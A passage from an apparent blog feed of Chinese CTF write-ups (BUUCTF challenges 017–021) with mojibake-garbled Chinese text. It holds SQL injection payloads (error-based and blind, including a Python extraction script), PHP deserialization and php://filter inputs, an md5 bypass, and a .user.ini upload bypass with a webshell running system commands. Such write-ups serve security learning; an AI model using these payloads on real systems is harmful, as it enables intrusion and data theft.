href="https://blog.csdn.net/TM_1024/article/details/107045217?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161250725916780299095581%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161250725916780299095581&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-107045217.pc_search_result_no_baidu_js&utm_term=%255B%25E7%25BD%2591%25E9%25BC%258E%25E6%259D%25AF+2018%255DFakebook">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜021</title>
    <link href="/2021/02/04/BUU021/"/>
    <url>/2021/02/04/BUU021/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåä¸€ã€"><a href="#äºŒåä¸€ã€" class="headerlink" title="äºŒåä¸€ã€"></a>äºŒåä¸€ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL<br><img src="https://ftp.bmp.ovh/imgs/2021/02/a691058ea35deb23.png">     </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><code>1&#39;</code>æŠ¥é”™<br><code>1&#39;#</code>æ²¡æœ‰æŠ¥é”™<br>åº”è¯¥æ˜¯å•å¼•å·å§<br><code>1&#39; order by 1#</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/bb1b936889bdfec4.png"><br>åˆæ˜¯è¿‡æ»¤selectã€orã€andã€ç©ºæ ¼ã€=â€¦â€¦.<br>åˆè¿‡æ»¤äº†å¥½å¤š<br>1^1æ­£å¸¸ï¼Œ<code>^</code>æ²¡æœ‰è¢«è¿‡<br>çœ‹wpè¯´ç”¨æŠ¥é”™æ³¨å…¥<code>extractvalue</code>æˆ–è€…<code>updatexml</code><br><code>ç©ºæ ¼</code>ç”¨æ‹¬å·<br><code>=</code>å¯ä»¥ç”¨<code>like</code>ä»£æ›¿         </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>0x7e=â€™~â€™<br><code>1%27^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23</code>è·å–å½“å‰åº“ <img src="https://ftp.bmp.ovh/imgs/2021/02/03a9b87ac4eb570b.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e))%23</code>è·å–è¡¨   <img src="https://ftp.bmp.ovh/imgs/2021/02/57ffbf2ef4fe4254.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e))%23</code>åˆ—  <img src="https://ftp.bmp.ovh/imgs/2021/02/83d7e8bc9bed4cec.png"><br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e))%23</code>password<img src="https://ftp.bmp.ovh/imgs/2021/02/0133a6c9f86e4091.png"><br>å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€éƒ¨åˆ†<br>å¯ä»¥åˆ©ç”¨<code>right()</code>å‡½æ•°è·å–å‰©ä½™éƒ¨åˆ†<br><code>1%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e))%23 </code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/8f2b93bb89cadc01.png">     </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><p><code>right()</code>å‡½æ•°       </p><blockquote><p>right(s,n):è¿”å›å­—ç¬¦ä¸²sçš„ånä½<br>left(s,n):è¿”å›å­—ç¬¦ä¸²sçš„å‰nä½          </p></blockquote></li><li><p>extractvalueå‡½æ•°        </p><blockquote><p>è¯­æ³•ï¼š<code>extractvalue(xml_document,Xpath_string)</code><br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢çš„å­—ç¬¦ä¸²<br>åˆ©ç”¨ï¼šå¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯ä¸­<br>payloadï¼š<code>id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(sqlè¯­å¥))))</code><br>â€˜~â€™ä¹Ÿå¯ä»¥æ¢æˆâ€™#â€™ã€â€™$â€™ç­‰ä¸æ»¡è¶³xpathæ ¼å¼çš„å­—ç¬¦<br>extractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦çš„ç»“æœè¶…è¿‡32ï¼Œå°±è¦ç”¨substring()å‡½æ•°æˆªå–æˆ–limitåˆ†é¡µï¼Œä¸€æ¬¡æŸ¥çœ‹æœ€å¤š32ä½             </p></blockquote></li><li><p>updatexmlå‡½æ•°         </p><blockquote><p>è¯­æ³•ï¼š<code>updatexml(xml_document,xpath_string,new_value)</code><br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueæ˜¯stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„è´Ÿè·æ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼<br>ç¬¬äºŒä¸ªå‚æ•°è·Ÿextractvalueå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸€æ ·ï¼Œå› æ­¤ä¹Ÿå¯ä»¥åˆ©ç”¨ï¼Œä¸”åˆ©ç”¨æ–¹å¼ç›¸åŒ<br>payloadï¼š<code>1&#39;or(updatexml(1,concat(&#39;~&#39;,(sqlè¯­å¥)),1))%23</code>      </p></blockquote></li></ul><p><a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">åç§MySQLæŠ¥é”™æ³¨å…¥</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜020</title>
    <link href="/2021/02/03/BUU020/"/>
    <url>/2021/02/03/BUU020/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒåã€"><a href="#äºŒåã€" class="headerlink" title="äºŒåã€"></a>äºŒåã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World<img src="https://ftp.bmp.ovh/imgs/2021/02/89cf401b467058ca.png">       </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¾“å…¥ä¸å›æ˜¾      </p><pre><code>0         Error Occured When Fetch Result.           1           Hello, glzjin wants a girlfriend.           2            Do you want to be my girlfriend?          3     Error Occured When Fetch Result.  1&#39; or 1=1#     SQL Injection Checked.      </code></pre><p>åº”è¯¥æ˜¯æœ‰è¿‡æ»¤çš„ï¼Œburpçœ‹çœ‹<img src="https://ftp.bmp.ovh/imgs/2021/02/3880c49a96ccc108.png"><br>482çš„éƒ½è¢«è¿‡æ»¤äº†<br><code>unionã€selectã€ç©ºæ ¼ã€#ã€+ã€-ã€‚ã€‚ã€‚ã€‚ã€‚  </code><br>åŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°asciiå’Œsubstræ²¡æœ‰è¢«è¿‡ï¼Œ<br>è¾“å…¥2/2å¯ä»¥åˆ¤æ–­æ˜¯æ•°å­—å‹<br>ç©ºæ ¼å¯ä»¥ç”¨<code>()</code>ç»•è¿‡<br>æˆ–è€…å¼‚æˆ–<code>1^</code><br>payload:<code>1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</code> </p><p>åˆ«äººwpé‡Œçœ‹åˆ°çš„é¢˜ç›®æºç          </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbuser=<span class="hljs-string">&#x27;root&#x27;</span>;$dbpass=<span class="hljs-string">&#x27;root&#x27;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params">$sql</span>)</span>&#123;    <span class="hljs-comment">#è¢«è¿‡æ»¤çš„å†…å®¹ å‡½æ•°åŸºæœ¬æ²¡è¿‡æ»¤</span>    $blackList = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;||&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&#x27;group&#x27;</span>,<span class="hljs-string">&#x27;limit&#x27;</span>,<span class="hljs-string">&#x27;update&#x27;</span>,<span class="hljs-string">&#x27;delete&#x27;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;load_file&#x27;</span>,<span class="hljs-string">&#x27;outfile&#x27;</span>,<span class="hljs-string">&#x27;./&#x27;</span>);    <span class="hljs-keyword">foreach</span>($blackList <span class="hljs-keyword">as</span> $blackitem)&#123;        <span class="hljs-keyword">if</span>(stripos($sql,$blackitem))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;    $id = $_POST[<span class="hljs-string">&#x27;id&#x27;</span>];&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>();&#125;$db = mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,$dbuser,$dbpass);<span class="hljs-keyword">if</span>(!$db)&#123;    <span class="hljs-keyword">die</span>(mysql_error());&#125;   mysql_select_db(<span class="hljs-string">&quot;ctf&quot;</span>,$db);<span class="hljs-keyword">if</span>(safe($id))&#123;    $query = mysql_query(<span class="hljs-string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);        <span class="hljs-keyword">if</span>($query)&#123;        $result = mysql_fetch_array($query);                <span class="hljs-keyword">if</span>($result)&#123;            <span class="hljs-keyword">echo</span> $result[<span class="hljs-string">&#x27;content&#x27;</span>];        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error Occured When Fetch Result.&quot;</span>;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        var_dump($query);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;SQL Injection Checked.&quot;</span>);&#125;</code></pre></code></pre><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><pre><code><pre><code class="hljs php">import requestsimport base64import sysimport <span class="hljs-keyword">string</span>import hashlibimport ioimport timesys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<span class="hljs-comment">#æ”¹å˜æ ‡å‡†è¾“å‡ºçš„é»˜è®¤ç¼–ç ,å¦åˆ™s.textä¸èƒ½è¾“å‡º</span>x = <span class="hljs-keyword">string</span>.printableflag = <span class="hljs-string">&quot;&quot;</span>url = <span class="hljs-string">&quot;http://56039d8e-d2a3-4fc1-8195-3e18f2c1ea8c.node3.buuoj.cn/index.php&quot;</span>payload=&#123;<span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-string">&quot;&quot;</span>&#125;<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>):<span class="hljs-keyword">for</span> j in x:payload[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;1=(ascii(substr((select(flag)from(flag)),%s,1))=%s)=1&quot;</span>%(str(i),ord(j))s = requests.post(url,data=payload)<span class="hljs-comment">#print(s.text)</span><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> in s.text:flag += j<span class="hljs-keyword">print</span>(flag)<span class="hljs-keyword">break</span><span class="hljs-keyword">print</span>(flag)</code></pre></code></pre><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><strong>ç©ºæ ¼ç»•è¿‡</strong>    </p><ol><li>ç”¨æ‹¬å·å°†ä»»ä½•å¯ä»¥è®¡ç®—ç»“æœçš„è¯­å¥æ‹¬èµ·æ¥        </li><li>å¼‚æˆ–<br> 1^1=0<br> 0^0=0<br> 1^0=1          </li></ol><hr><p>æƒ³ç€ç”¨ifæ„é€ payloadï¼š<code>if(ascii(substr((select(flag)from(flag)),1,1))&gt;127)</code>ä½†è¿è¡Œå‡ºæ¥éƒ½æ˜¯äº›æ–¹æ¡†æ¡†               </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜019</title>
    <link href="/2021/02/02/BUU019/"/>
    <url>/2021/02/02/BUU019/</url>
    
    <content type="html"><![CDATA[<h2 id="åä¹ã€"><a href="#åä¹ã€" class="headerlink" title="åä¹ã€"></a>åä¹ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[ZJCTF 2019]NiZhuanSiWei<br><img src="https://ftp.bmp.ovh/imgs/2021/02/6451d712fe5dcc0a.png">      </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¼ ä¸€ä¸ª<code>$text</code>è¦å…¶ç­‰äº<code>welcome to the zjctf</code>è¿™é‡Œç”¨çš„<code>file_get_contentså‡½æ•°</code><br>å¯ä»¥ç”¨<code>data://text/plain;base64,</code>ä¼ªåè®®ä¼ å…¥<br>ä¸‹é¢fileä¸­è¿‡æ»¤äº†flagï¼Œçœ‹æ¥ä¸èƒ½ç”¨<code>php://filter</code>ä¼ªåè®®è¯»å–<code>flag.php</code>äº†ï¼Œä½†å¯ä»¥è¯»å–<code>useless.php</code>çœ‹çœ‹æœ‰ä»€ä¹ˆ<br>payloadï¼š<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span>    <span class="hljs-keyword">public</span> $file;      <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;          <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;              <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);             <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);        &#125;      &#125;  &#125;  <span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>__tostring</code>æ–¹æ³•å½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²echoæ˜¯è‡ªåŠ¨æ‰§è¡Œ<br>æ‰€ä»¥å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„passwordå¾—åˆ°flag<br>å…ˆåºåˆ—åŒ–        </p><pre><code>```php&lt;?php  class Flag&#123;  //flag.php      public $file=&#39;flag.php&#39;;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125; $a=new Flag();echo serialize($a); ?&gt;       ```      </code></pre><p>è¿è¡Œç»“æœ<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>        </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>payloadï¼š<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br>æºç ä¸­å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/16051bee3a20c7e8.png">      </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜018</title>
    <link href="/2021/02/01/BUU018/"/>
    <url>/2021/02/01/BUU018/</url>
    
    <content type="html"><![CDATA[<h2 id="åå…«ã€"><a href="#åå…«ã€" class="headerlink" title="åå…«ã€"></a>åå…«ã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[BJDCTF2020]Easy MD5<br><img src="https://ftp.bmp.ovh/imgs/2021/02/a09e4e215d6be9b9.png"> </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ— è®ºæäº¤ä»€ä¹ˆéƒ½æ²¡æœ‰ä»€ä¹ˆå›åº”<br>å“åº”å¤´é‡Œå‘ç°ä¸ªhint<img src="https://ftp.bmp.ovh/imgs/2021/02/85ff7f61e127f882.png"><br>æäº¤çš„å‚æ•°ä¼šç»è¿‡md5å‡½æ•°ï¼Œtrueçš„æ„æ€æ˜¯è¿”å›16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²<img src="https://ftp.bmp.ovh/imgs/2021/02/44eeb75c3480556f.png"><br>å¯¹äºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒMD5é»˜è®¤æ—¶è¿”å›32ä½çš„16è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼Œæœ‰trueåï¼Œ32ä½æ¯ä¸¤ä½å¯¹åº”çš„åè¿›åˆ¶å¯¹åº”çš„ASCIIç ä¸­çš„å­—ç¬¦<br>æ¯”å¦‚ï¼š<code>ffifdyop</code>MD5åæ˜¯<code>276f722736c95d99e921722cf9ed621c</code>,27å¯¹åº”åè¿›åˆ¶çš„39ï¼Œ39åœ¨ASCIIç è¡¨ä¸­æ˜¯<code>&#39;</code>å•å¼•å·ï¼›æ‰€ä»¥ä¸Šé¢çš„ç»è¿‡<code>md5($pass,true)</code>åæ˜¯<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code>å¸¦å…¥åˆ°sqlè¯­å¥ä¸­å°±æ˜¯<code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>å°±æ°¸çœŸäº†<br>è¾“å…¥<code>ffifdyop</code>æŸ¥è¯¢<img src="https://ftp.bmp.ovh/imgs/2021/02/099cb5b53d346299.png"><br>å¯ä»¥æ•°ç»„ç»•è¿‡         </p><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p><code>a[]=1&amp;b[]=2</code><img src="https://ftp.bmp.ovh/imgs/2021/02/2ac547d4b6ae0d1d.png"><br>è®¿é—®<code>levell14.php</code><img src="https://ftp.bmp.ovh/imgs/2021/02/4ff741a8ea4d3ca8.png">        </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code>ç»•è¿‡â€”â€”â€“<code>ffifdyop</code><br>phpå¼±ç±»å‹æ¯”è¾ƒ<br><code>0exxx</code><br><code>æ•°ç»„</code>        </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜017</title>
    <link href="/2021/01/31/BUU017/"/>
    <url>/2021/01/31/BUU017/</url>
    
    <content type="html"><![CDATA[<h2 id="åä¸ƒã€"><a href="#åä¸ƒã€" class="headerlink" title="åä¸ƒã€"></a>åä¸ƒã€</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>[SUCTF 2019]CheckIn<br><img src="https://ftp.bmp.ovh/imgs/2021/01/cf0dc95dec9e9c82.png">   </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ–‡ä»¶ä¸Šä¼ <br>å¹¶ä¸”ç»™äº†æºç <code>https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</code>          </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// error_reporting(0);</span>$userdir = <span class="hljs-string">&quot;uploads/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-keyword">if</span> (!file_exists($userdir)) &#123;    mkdir($userdir, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);&#125;file_put_contents($userdir . <span class="hljs-string">&quot;/index.php&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;    $tmp_name = $_FILES[<span class="hljs-string">&quot;fileUpload&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];    $name = $_FILES[<span class="hljs-string">&quot;fileUpload&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];    <span class="hljs-keyword">if</span> (!$tmp_name) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;filesize too big!&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (!$name) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;filename cannot be empty!&quot;</span>);    &#125;    $extension = substr($name, strrpos($name, <span class="hljs-string">&quot;.&quot;</span>) + <span class="hljs-number">1</span>);         <span class="hljs-comment">//å¾—åˆ°åç¼€</span>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ph|htacess/i&quot;</span>, $extension)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal suffix!&quot;</span>);           <span class="hljs-comment">//iåŒºåˆ†äº†å¤§å°å†™</span>    &#125;    <span class="hljs-keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&amp;lt;? in contents!&quot;</span>);    &#125;                  <span class="hljs-comment">//è¿‡æ»¤<span class="hljs-meta">&lt;?</span></span>    $image_type = exif_imagetype($tmp_name);    <span class="hljs-comment">//åˆ¤æ–­å›¾åƒç±»å‹</span>    <span class="hljs-keyword">if</span> (!$image_type) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;exif_imagetype:not image!&quot;</span>);    &#125;    $upload_file_path = $userdir . <span class="hljs-string">&quot;/&quot;</span> . $name;    move_uploaded_file($tmp_name, $upload_file_path);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your dir &quot;</span> . $userdir. <span class="hljs-string">&#x27; &lt;br&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your files : &lt;br&gt;&#x27;</span>;    var_dump(scandir($userdir));&#125;</code></pre></code></pre><h3 id="è§£"><a href="#è§£" class="headerlink" title="è§£"></a>è§£</h3><p>çœ‹åˆ«äººwpçŸ¥é“éœ€è¦ä¸Šä¼ ä¸ª<code>.user.ini</code><br>ç„¶ååœ¨ä¸Šä¼ å›¾ç‰‡é©¬<br><code>exif_imagetype</code>å¯ä»¥ç”¨æ–‡ä»¶å¤´ç»•è¿‡<code>GIF89a</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/39c550bc2f0f01d7.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/707658987a1ea540.png"><br>èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/643389a70dcab484.png"><br>æˆ–è€…<br>æ„é€ è¿™æ ·çš„é©¬ï¼š<code>&lt;script language=&quot;php&quot;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt; </code>ç›´æ¥è®¿é—®<code>http://f07dace7-4865-447a-acdb-e7612afc49d7.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php</code>å³å¯å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8b3db3af2203d029.png">     </p><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li><code>.user.ini</code>         <ul><li> php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æœ‰è®¸å¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®åˆåˆ†ä¸ºä¸‹é¢å‡ ç§<img src="https://ftp.bmp.ovh/imgs/2021/01/e091aabefa65091e.png">        </li><li> <code>PHP_INI_USER</code>çš„é…ç½®é¡¹å¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®  </li><li> <a href="https://www.php.net/manual/zh/ini.list.php">php.inié…ç½®é€‰é¡¹åˆ—è¡¨</a>        </li><li>å…¶ä¸­æœ‰ä¸€ä¸ª<code>auto_append_file</code> <img src="https://ftp.bmp.ovh/imgs/2021/01/5408d7feb83d1e15.png">æ„æ€å°±æ˜¯å¯ä»¥è®©phpæ–‡ä»¶æ‰§è¡Œå‰åŒ…å«ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶         </li><li>ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…user_ini.cache_ttlæ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€€               </li><li>åˆ©ç”¨æ¡ä»¶ï¼š1.æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHPï¼›2.ä¸Šä¼ çš„ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ï¼ˆå¦‚æœ¬é¢˜çš„index.phpï¼‰3.æœåŠ¡å™¨ä½¿ç”¨CGI/FastCGIæ¨¡å¼</li></ul></li></ul><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜016</title>
    <link href="/2021/01/30/BUU016/"/>
    <url>/2021/01/30/BUU016/</url>
    
